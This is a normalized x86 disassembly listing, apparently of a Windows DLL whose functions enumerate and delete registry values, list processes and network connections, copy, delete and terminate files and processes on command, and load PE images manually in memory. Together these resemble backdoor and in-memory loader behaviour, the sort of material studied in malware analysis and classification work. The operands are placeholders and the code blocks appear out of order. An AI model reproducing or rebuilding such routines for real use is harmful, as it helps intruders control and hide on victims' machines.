lea edi [ ebp - 0x324 ]
dec edi
push ebx
push ebx
lea eax [ ebp - 0x548 ]
push eax
push ebx
lea eax [ ebp - 0x540 ]
push eax
lea eax [ ebp - 0x114 ]
push eax
mov [ ebp - 0x538 ] ebx
mov edi 0x100
push ebx
jmp r-xdata
lea eax [ ebp - 0x538 ]
push eax
push 0xf003f
push ebx
lea eax [ ebp - 0x21c ]
push eax
push edi
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x21c ]
push eax
push edi
call sub_100088e0
pop ecx
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov esi r--data
movsw [ edi ] [ esi ]
lea eax [ ebp - 0x324 ]
movsb [ edi ] [ esi ]
mov esi [ ebp - 0x53c ]
push eax
call sub_1000b760
inc [ ebp - 0x538 ]
pop ecx
lea eax [ ebp - 0x55c ]
push eax
push ebx
push ebx
push ebx
lea eax [ ebp - 0x540 ]
push eax
lea eax [ ebp - 0x322 ]
push eax
push [ ebp - 0x538 ]
push [ ebp - 0x544 ]
mov [ ebp - 0x540 ] edi
call [ RegEnumValueA@IAT ]
test eax eax
je r-xdata
mov esi [ ebp - 0x53c ]
push r--data
jmp r-xdata
lea eax [ ebp - 0x114 ]
push eax
push [ ebp - 0x538 ]
call [ RegDeleteValueA@IAT ]
push [ ebp - 0x538 ]
mov esi eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
cmp eax ebx
je r-xdata
cmp [ ebp - 0x548 ] 0x1
jne r-xdata
push [ ebp - 0x544 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
push 0x4
pop eax
cmp [ ebp - 0x548 ] eax
jne r-xdata
lea eax [ ebp - 0x540 ]
push eax
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x548 ]
push eax
push ebx
lea eax [ ebp - 0x114 ]
push eax
push [ ebp - 0x544 ]
mov [ ebp - 0x540 ] edi
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
cmp [ ebp - 0x548 ] 0x3
lea eax [ ebp - 0x114 ]
push eax
lea eax [ ebp - 0x324 ]
jne r-xdata
mov [ ebp - 0x540 ] eax
lea eax [ ebp - 0x540 ]
push eax
lea eax [ ebp - 0x54c ]
push eax
lea eax [ ebp - 0x548 ]
push eax
push ebx
lea eax [ ebp - 0x114 ]
push eax
push [ ebp - 0x544 ]
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
mov esi [ ebp - 0x53c ]
lea eax [ ebp - 0x324 ]
push eax
call sub_1000b760
inc [ ebp - 0x538 ]
pop ecx
push ebx
push ebx
lea eax [ ebp - 0x548 ]
push eax
push ebx
lea eax [ ebp - 0x540 ]
push eax
lea eax [ ebp - 0x114 ]
push eax
push [ ebp - 0x538 ]
lea eax [ ebp - 0x42c ]
push eax
lea eax [ ebp - 0x114 ]
push eax
push r--data
jmp r-xdata
push r--data
push r--data
jmp r-xdata
push [ ebp - 0x54c ]
lea eax [ ebp - 0x114 ]
push eax
push r--data
lea eax [ ebp - 0x324 ]
push eax
call sub_1000c36c
add esp 0x10
jmp r-xdata
push eax
call sub_1000c36c
add esp 0xc
sub_10009ad0
push ebp
mov ebp esp
sub esp 0x130
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0x0
push 0x2
mov esi ecx
call CreateToolhelp32Snapshot
mov edi eax
cmp edi 0xffffffff
je r-xdata
push r--data
call sub_1000b760
pop ecx
lea eax [ ebp - 0x130 ]
push eax
push edi
mov [ ebp - 0x130 ] 0x128
call Process32First
jmp r-xdata
test eax eax
jne r-xdata
push [ ebp - 0x11c ]
lea eax [ ebp - 0x10c ]
push [ ebp - 0x118 ]
push [ ebp - 0x128 ]
push eax
push r--data
call sub_1000b760
add esp 0x14
lea eax [ ebp - 0x130 ]
push eax
push edi
call Process32Next
push edi
call [ CloseHandle@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1000c176
leave
retn
sub_10009b6b
push ebp
lea ebp [ esp - 0xa4 ]
sub esp 0x124
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xa0 ] eax
mov eax [ ebp + 0xac ]
push ebx
push edi
xor edi edi
push r--data
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x70 ] edi
call [ LoadLibraryA@IAT ]
mov ebx eax
cmp ebx edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push ebx
call esi
mov [ ebp - 0x68 ] eax
cmp eax edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
push r--data
push ebx
call esi
mov [ ebp - 0x80 ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp + 0xa0 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000c176
add ebp 0xa4
leave
retn
pop esi
push edi
lea eax [ ebp - 0x74 ]
push eax
push edi
call [ ebp - 0x68 ]
push edi
lea eax [ ebp - 0x70 ]
push eax
push edi
call [ ebp - 0x80 ]
push [ ebp - 0x74 ]
call sub_1000cef2
push [ ebp - 0x70 ]
mov ebx eax
mov [ ebp - 0x7c ] ebx
call sub_1000cef2
pop ecx
pop ecx
mov edi eax
push 0x1
lea eax [ ebp - 0x74 ]
push eax
push ebx
mov [ ebp - 0x78 ] edi
call [ ebp - 0x68 ]
mov esi [ ebp - 0x6c ]
test eax eax
je r-xdata
push r--data
call sub_1000b760
and [ ebp - 0x68 ] 0x0
cmp [ ebx ] 0x0
pop ecx
jbe r-xdata
push r--data
call sub_1000b760
push ebx
call sub_1000c3e9
push edi
call sub_1000c3e9
add esp 0xc
push ebx
call sub_1000c3e9
pop ecx
push 0x1
lea eax [ ebp - 0x70 ]
push eax
push edi
call [ ebp - 0x80 ]
test eax eax
je r-xdata
add ebx 0x10
xor ebx ebx
cmp [ edi ] ebx
jbe r-xdata
mov esi [ ebp - 0x6c ]
push r--data
call sub_1000b760
push edi
call sub_1000c3e9
pop ecx
or eax 0xffffffff
jmp r-xdata
lea edi [ ebp - 0x64 ]
dec edi
jmp [ eax * 4 + jump_table_10009e77 ]
push edi
call sub_1000c3e9
xor eax eax
inc eax
add edi 0x8
pop ecx
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
lea edi [ ebp - 0x64 ]
dec edi
movzx eax [ edi ]
mov esi [ edi - 0x4 ]
push eax
call ntohs
movzx eax ax
push eax
push esi
call inet_ntoa
mov esi [ ebp - 0x6c ]
push eax
push r--data
call sub_1000b760
mov eax [ ebp - 0x78 ]
add esp 0xc
inc ebx
add edi 0x8
cmp ebx [ eax ]
jb r-xdata
mov edi eax
movzx eax [ ebx + 0x4 ]
mov esi [ ebx - 0x8 ]
mov edi [ ebx ]
push eax
call ntohs
movzx eax ax
push eax
push edi
call inet_ntoa
push eax
movzx eax [ ebx - 0x4 ]
push eax
call ntohs
movzx eax ax
push eax
push esi
call inet_ntoa
push eax
lea eax [ ebp - 0x64 ]
push r--data
push eax
call sub_1000c36c
mov eax [ ebx - 0xc ]
add esp 0x18
dec eax
cmp eax 0xb
ja r-xdata
mov edi [ ebp - 0x78 ]
mov ebx eax
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov esi r--data
jmp r-xdata
mov esi [ ebp - 0x6c ]
lea eax [ ebp - 0x64 ]
push eax
push r--data
call sub_1000b760
inc [ ebp - 0x68 ]
mov eax [ ebp - 0x7c ]
pop ecx
pop ecx
mov ecx [ ebp - 0x68 ]
add ebx 0x14
cmp ecx [ eax ]
jb r-xdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
jmp r-xdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
movsb [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub_10009ea7
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
lea ecx [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
jne r-xdata
push [ ebp + 0x8 ]
call sub_1000d698
push eax
push r--data
mov [ rw-data ] eax
call sub_1000b760
add esp 0xc
push [ rw-data ]
push r--data
call sub_1000b760
pop ecx
pop ecx
jmp r-xdata
xor eax eax
pop esi
leave
retn
sub_10009ef3
push ebp
lea ebp [ esp - 0x194 ]
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x190 ] eax
mov eax [ ebp + 0x19c ]
push ebx
push esi
push edi
mov edi 0x103
xor ebx ebx
push edi
mov [ ebp - 0x7c ] eax
lea eax [ ebp - 0x77 ]
push ebx
push eax
mov esi ecx
mov [ ebp - 0x78 ] bl
call sub_1000ebe0
push edi
lea eax [ ebp + 0x8d ]
push ebx
push eax
mov [ ebp + 0x8c ] bl
call sub_1000ebe0
mov edi r--data
push edi
push esi
call sub_1000e2b4
add esp 0x20
cmp eax ebx
je r-xdata
lea eax [ ebp + 0x8c ]
lea edx [ eax + 0x1 ]
lea edx [ ebp - 0x78 ]
sub edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push edi
push ebx
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp + 0x8c ]
lea edx [ eax + 0x1 ]
mov edi r--data
push edi
push esi
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
lea edx [ ebp + 0x8c ]
sub edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
lea edx [ ebp - 0x78 ]
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp - 0x78 ]
call sub_10007ee0
test eax eax
je r-xdata
push r--data
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push edi
push ebx
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push r--data
push 0x1
lea eax [ ebp + 0x8c ]
push eax
lea eax [ ebp - 0x78 ]
push eax
call [ CopyFileA@IAT ]
mov esi [ ebp - 0x7c ]
test eax eax
je r-xdata
mov esi [ ebp - 0x7c ]
call sub_1000b760
or eax 0xffffffff
lea edx [ ebp + 0x8c ]
sub edx eax
push r--data
push r--data
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
pop ecx
mov ecx [ ebp + 0x190 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
add ebp 0x194
leave
retn
call sub_1000b760
xor eax eax
jmp r-xdata
sub_1000a059
push ebp
lea ebp [ esp - 0x194 ]
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x190 ] eax
mov eax [ ebp + 0x19c ]
push ebx
push esi
mov esi 0x103
xor ebx ebx
push esi
mov [ ebp - 0x7c ] eax
lea eax [ ebp + 0x8d ]
push ebx
push eax
mov [ ebp + 0x8c ] bl
call sub_1000ebe0
push esi
lea eax [ ebp - 0x77 ]
push ebx
push eax
mov [ ebp - 0x78 ] bl
call sub_1000ebe0
mov esi r--data
push esi
push edi
call sub_1000e2b4
add esp 0x20
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x78 ]
lea edx [ eax + 0x1 ]
lea edx [ ebp + 0x8c ]
sub edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push esi
push ebx
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x78 ]
lea edx [ eax + 0x1 ]
mov esi r--data
push esi
push edi
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
lea edx [ ebp - 0x78 ]
sub edx eax
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
jne r-xdata
lea edx [ ebp + 0x8c ]
sub edx eax
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
lea eax [ ebp + 0x8c ]
call sub_10007ee0
test eax eax
je r-xdata
push r--data
jmp r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push esi
push ebx
call sub_1000e2b4
pop ecx
pop ecx
cmp eax ebx
je r-xdata
push r--data
lea esi [ ebp + 0x8c ]
call sub_10007f00
test eax eax
jne r-xdata
mov esi [ ebp - 0x7c ]
call sub_1000b760
or eax 0xffffffff
lea edx [ ebp - 0x78 ]
sub edx eax
push 0x1
lea eax [ ebp - 0x78 ]
push eax
mov eax esi
push eax
call [ CopyFileA@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
cmp cl bl
jne r-xdata
push r--data
mov eax esi
push eax
call [ DeleteFileA@IAT ]
push r--data
jmp r-xdata
pop ecx
mov ecx [ ebp + 0x190 ]
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
add ebp 0x194
leave
retn
mov esi [ ebp - 0x7c ]
call sub_1000b760
xor eax eax
jmp r-xdata
sub_1000a1cc
push ebp
mov ebp esp
sub esp 0x248
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
xor ebx ebx
push 0x124
mov [ ebp - 0x248 ] eax
lea eax [ ebp - 0x238 ]
push ebx
push eax
mov edi ecx
mov [ ebp - 0x23c ] ebx
call sub_1000ebe0
push 0x2
push r--data
push edi
call sub_1000e13b
add esp 0x18
xor esi esi
test eax eax
jne r-xdata
lea ecx [ ebp - 0x114 ]
mov eax edi
sub ecx edi
add edi 0x3
push edi
inc esi
call sub_1000d6ae
pop ecx
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov dl [ eax ]
mov [ ecx + eax ] dl
inc eax
cmp dl bl
jne r-xdata
mov [ ebp - 0x244 ] ebx
cmp esi ebx
jne r-xdata
cmp esi 0x1
jne r-xdata
push ebx
push 0x2
call CreateToolhelp32Snapshot
mov [ ebp - 0x240 ] eax
or eax 0xffffffff
cmp [ ebp - 0x240 ] eax
je r-xdata
push r--data
cmp [ ebp - 0x240 ] ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
lea eax [ ebp - 0x23c ]
push eax
push [ ebp - 0x240 ]
mov [ ebp - 0x23c ] 0x128
call Process32First
jmp r-xdata
push [ ebp - 0x240 ]
push ebx
push esi
call [ OpenProcess@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
test eax eax
jne r-xdata
push ebx
push edi
call [ TerminateProcess@IAT ]
push edi
call [ CloseHandle@IAT ]
mov [ ebp - 0x244 ] esi
lea eax [ ebp - 0x114 ]
lea edx [ eax + 0x1 ]
push [ ebp - 0x240 ]
call [ CloseHandle@IAT ]
jmp r-xdata
push r--data
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov esi eax
lea eax [ ebp - 0x218 ]
lea ecx [ eax + 0x1 ]
cmp [ ebp - 0x244 ] ebx
je r-xdata
mov esi [ ebp - 0x248 ]
call sub_1000b760
pop ecx
xor eax eax
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax ecx
cmp esi eax
ja r-xdata
lea eax [ ebp - 0x23c ]
push eax
push [ ebp - 0x240 ]
call Process32Next
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov ecx eax
lea eax [ ebp - 0x114 ]
lea edi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
sub ecx eax
lea eax [ ebp + ecx - 0x218 ]
push eax
lea eax [ ebp - 0x114 ]
push eax
call sub_1000c31a
pop ecx
pop ecx
test eax eax
jne r-xdata
push [ ebp - 0x234 ]
push ebx
push 0x1
call [ OpenProcess@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push ebx
push edi
call [ TerminateProcess@IAT ]
push edi
call [ CloseHandle@IAT ]
inc [ ebp - 0x244 ]
sub_1000a3b5
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x228 ] eax
mov eax [ ebp + 0x10 ]
push 0x103
mov [ ebp - 0x220 ] eax
xor edi edi
lea eax [ ebp - 0x10f ]
push edi
push eax
mov [ ebp - 0x110 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x40c
call sub_1000cef2
pop ecx
cmp eax edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
mov [ eax + 0x2 ] cx
mov [ eax + 0x404 ] eax
mov [ eax + 0x408 ] edi
mov esi eax
xor esi esi
jmp r-xdata
mov [ ebp - 0x21c ] edi
cmp [ ebp + 0xc ] edi
jbe r-xdata
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x224 ] esi
cmp esi edi
jne r-xdata
xor edi edi
mov eax esi
mov ebx 0x104
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
movzx ecx [ eax + 0x2 ]
movzx edx [ eax ]
mov eax [ eax + 0x408 ]
sub ecx edx
add edi ecx
test eax eax
jne r-xdata
push edi
call sub_1000cef2
mov esi eax
pop ecx
test esi esi
je r-xdata
push r--data
push ecx
push eax
lea eax [ ebp - 0x218 ]
push eax
call sub_10013da0
lea eax [ ebp - 0x214 ]
add esp 0xc
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x224 ]
push edi
push eax
mov ebx esi
call sub_1000b860
push 0x0
push [ ebp - 0x220 ]
mov ecx edi
mov edx esi
call sub_1000a68d
push esi
call sub_1000c3e9
add esp 0x14
xor eax eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ ebp - 0x214 ]
call sub_10007b20
push eax
movzx eax [ ebp - 0x218 ]
push eax
push r--data
call sub_1000b760
movzx eax [ ebp - 0x218 ]
add esp 0xc
dec eax
cmp eax 0xc
ja r-xdata
push ebx
lea eax [ ebp - 0x110 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
call [ ExpandEnvironmentStringsA@IAT ]
xor eax eax
push r--data
jmp r-xdata
jmp [ eax * 4 + jump_table_1000a659 ]
mov cl [ ebp + eax - 0x110 ]
mov [ ebp + eax - 0x214 ] cl
inc eax
test cl cl
jne r-xdata
call sub_1000b760
pop ecx
lea eax [ ebp - 0x214 ]
push esi
push eax
call sub_10008ac9
jmp r-xdata
push [ ebp - 0x220 ]
lea ecx [ ebp - 0x214 ]
push esi
call sub_10008d0a
jmp r-xdata
push esi
lea ecx [ ebp - 0x214 ]
call sub_10008f3e
jmp r-xdata
mov edx esi
lea ecx [ ebp - 0x214 ]
call sub_10009074
jmp r-xdata
push esi
lea ecx [ ebp - 0x214 ]
call sub_10009429
jmp r-xdata
push esi
lea ecx [ ebp - 0x214 ]
call sub_100091c7
jmp r-xdata
mov ecx esi
call sub_10009ad0
jmp r-xdata
push esi
call sub_10009b6b
jmp r-xdata
lea eax [ ebp - 0x214 ]
push eax
mov eax esi
call sub_10009ea7
jmp r-xdata
push esi
lea ecx [ ebp - 0x214 ]
call sub_10009ef3
jmp r-xdata
push esi
lea edi [ ebp - 0x214 ]
call sub_1000a059
jmp r-xdata
push esi
lea ecx [ ebp - 0x214 ]
call sub_1000a1cc
jmp r-xdata
push rw-data
push r--data
call sub_1000b760
pop ecx
pop ecx
movzx ax [ ebp - 0x217 ]
add ax 0x4
add [ ebp - 0x21c ] ax
movzx edi [ ebp - 0x21c ]
cmp edi [ ebp + 0xc ]
jb r-xdata
push ebx
lea eax [ ebp - 0x218 ]
push 0x0
push eax
call sub_1000ebe0
mov eax [ ebp - 0x228 ]
add eax edi
movzx ecx [ eax + 0x1 ]
add ecx 0x4
add esp 0xc
cmp ecx [ ebp + 0xc ]
ja r-xdata
jmp r-xdata
sub_1000a68d
push ebp
mov ebp esp
sub esp 0x144
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov [ ebp - 0x144 ] eax
mov eax [ ebp + 0xc ]
push 0x7f
mov [ ebp - 0x13c ] eax
lea eax [ ebp - 0x87 ]
push 0x0
push eax
mov esi ecx
mov ebx edx
mov [ ebp - 0x88 ] 0x0
call sub_1000ebe0
add esp 0xc
lea eax [ esi + esi ]
cmp esi 0x800
ja r-xdata
push eax
mov [ ebp - 0x134 ] eax
call sub_1000cef2
mov edi eax
pop ecx
mov [ ebp - 0x138 ] edi
test edi edi
jne r-xdata
lea eax [ esi + esi + 0x1000 ]
push esi
push ebx
push edi
lea esi [ ebp - 0x134 ]
call sub_10008170
add esp 0xc
test eax eax
jge r-xdata
or eax 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x134 ]
lea eax [ ebx + 0xa8 ]
push eax
mov [ ebp - 0x140 ] eax
call sub_1000cef2
pop ecx
mov [ ebp - 0x134 ] eax
test eax eax
je r-xdata
push edi
call sub_1000c3e9
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000c176
leave
retn
mov esi r--data
lea edi [ ebp - 0x88 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea ecx [ ebp - 0x88 ]
push ecx
movsd [ edi ] [ esi ]
add eax 0xa8
push ebx
push eax
mov eax [ ebp - 0x138 ]
movsd [ edi ] [ esi ]
call sub_10007d20
add esp 0xc
push [ ebp - 0x138 ]
call sub_1000c3e9
cmp [ ebp - 0x13c ] 0x0
pop ecx
mov [ ebp - 0x130 ] 0x80
mov [ ebp - 0x12f ] 0x2
mov [ ebp - 0x12c ] ebx
je r-xdata
pop ecx
call sub_1000b8c0
push eax
lea eax [ ebp - 0x128 ]
push r--data
push eax
call sub_1000c36c
mov eax [ ebp - 0x13c ]
lea edx [ eax + 0x1 ]
push [ ebp - 0x134 ]
call sub_1000c3e9
xor eax eax
push [ ebp - 0x140 ]
push [ ebp - 0x134 ]
push [ ebp - 0x144 ]
call sub_10002230
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
je r-xdata
push 0x20
push [ ebp - 0x13c ]
lea eax [ ebp - 0x128 ]
push eax
call sub_1000ed3d
jmp r-xdata
add esp 0xc
push 0x80
lea eax [ ebp - 0x108 ]
push 0x0
push eax
call sub_1000ebe0
mov edi [ ebp - 0x134 ]
add esp 0xc
push 0x2a
mov eax sub_10002230
pop ecx
lea esi [ ebp - 0x130 ]
[ edi ] [ esi ]
test eax eax
je r-xdata
sub_1000a848
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0x14 ]
push esi
lea esi [ ecx + eax + 0x18 ]
xor ecx ecx
cmp cx [ eax + 0x6 ]
jae r-xdata
pop esi
leave
retn
push ebx
push edi
mov edi [ VirtualAlloc@IAT ]
add esi 0x10
mov ebx 0x1000
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
mov ecx [ esi + 0x4 ]
push [ esi ]
add ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
push ecx
push eax
call sub_10013da0
mov eax [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0xc ] eax
test eax eax
jle r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
pop edi
pop ebx
mov eax [ ebp + 0x10 ]
mov eax [ eax ]
movzx eax [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add esi 0x28
cmp [ ebp - 0x4 ] eax
jl r-xdata
push 0x4
push ebx
push eax
mov eax [ esi - 0x4 ]
add eax [ ebp - 0x8 ]
push eax
call edi
push [ ebp - 0xc ]
mov [ esi - 0x8 ] eax
push 0x0
push eax
call sub_1000ebe0
jmp r-xdata
add esp 0xc
sub_1000a8ef
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x14 ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
xor edx edx
lea ecx [ ecx + eax + 0x18 ]
cmp dx [ eax + 0x6 ]
jae r-xdata
leave
retn
push ebx
push esi
push edi
lea ebx [ ecx + 0x24 ]
mov edx [ ebx ]
lea ecx [ esi + ecx * 2 ]
lea ecx [ edi + ecx * 2 ]
mov edi [ ecx * 4 + rw-data ]
test edx 0x4000000
je r-xdata
push 0x4000
push [ ebx - 0x14 ]
push [ ebx - 0x1c ]
call [ VirtualFree@IAT ]
jmp r-xdata
mov esi [ ebx - 0x14 ]
mov ecx esi
test ecx ecx
jne r-xdata
or edi 0x200
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
movzx ecx [ eax + 0x6 ]
inc [ ebp - 0x4 ]
add ebx 0x28
cmp [ ebp - 0x4 ] ecx
jl r-xdata
jbe r-xdata
test dl 0x40
je r-xdata
mov esi [ ebx ]
mov edi [ ebx ]
mov ecx esi
shr ecx 0x1d
shr esi 0x1e
and ecx 0x1
and esi 0x1
shr edi 0x1f
test [ ebx ] 0x2000000
je r-xdata
pop edi
pop esi
pop ebx
lea eax [ ebp - 0x8 ]
push eax
push edi
push esi
push [ ebx - 0x1c ]
call [ VirtualProtect@IAT ]
test dl dl
jns r-xdata
mov ecx [ eax + 0x20 ]
jmp r-xdata
mov ecx [ eax + 0x24 ]
test ecx ecx
sub_1000a9b2
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ eax + 0x4 ]
mov eax [ eax ]
add eax 0xa0
cmp [ eax + 0x4 ] 0x0
jbe r-xdata
pop ebx
leave
retn
mov eax [ eax ]
add eax ebx
mov ecx [ eax ]
test ecx ecx
jbe r-xdata
push esi
push edi
add eax [ eax + 0x4 ]
mov ecx [ eax ]
test ecx ecx
ja r-xdata
movzx ecx [ esi ]
mov edx ecx
shr ecx 0xc
and edx 0xfff
cmp ecx 0x3
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ ecx + ebx ]
mov ecx [ eax + 0x4 ]
sub ecx 0x8
lea esi [ eax + 0x8 ]
test ecx 0xfffffffe
jbe r-xdata
pop edi
pop esi
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
add [ ecx ] edx
cmp ecx 0xa
jne r-xdata
mov ecx [ eax + 0x4 ]
inc [ ebp - 0x4 ]
sub ecx 0x8
inc esi
shr ecx 0x1
inc esi
cmp [ ebp - 0x4 ] ecx
jb r-xdata
sub_1000aa2b
sub esp 0xc
mov eax [ ebx ]
sub eax 0xffffff80
cmp [ eax + 0x4 ] 0x0
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x8 ] 0x1
jbe r-xdata
mov eax [ esp + 0x8 ]
pop ebp
add esp 0xc
retn
push edi
mov edi [ eax ]
push 0x14
add edi ebp
push edi
call [ IsBadReadPtr@IAT ]
test eax eax
jne r-xdata
pop edi
push esi
pop esi
add eax ebp
push eax
call [ LoadLibraryA@IAT ]
mov esi eax
mov [ esp + 0x14 ] esi
cmp esi 0xffffffff
je r-xdata
and [ esp + 0x10 ] 0x0
mov eax [ ebx + 0xc ]
lea eax [ eax * 4 + 0x4 ]
push eax
